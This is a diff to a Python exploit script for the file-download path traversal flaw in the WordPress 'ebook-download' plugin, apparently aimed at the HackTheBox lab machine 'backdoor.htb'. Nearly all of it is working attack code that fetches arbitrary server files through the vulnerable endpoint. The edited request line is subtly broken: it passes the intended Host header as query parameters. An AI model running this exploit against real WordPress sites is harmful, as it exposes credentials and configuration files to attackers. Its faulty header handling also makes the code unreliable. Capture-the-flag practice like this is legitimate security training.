@@ -10,8 +10,8 @@ def main():
         exit(1)
 
     filename = sys.argv[1]
-    url = f'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={filename}'
-    res = requests.get(url)
+    url = f'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl={filename}'
+    res = requests.get(url, {'Host': 'backdoor.htb'})
 
     first_line = 3 * filename
     last_line = '<script>window.close()</script>'
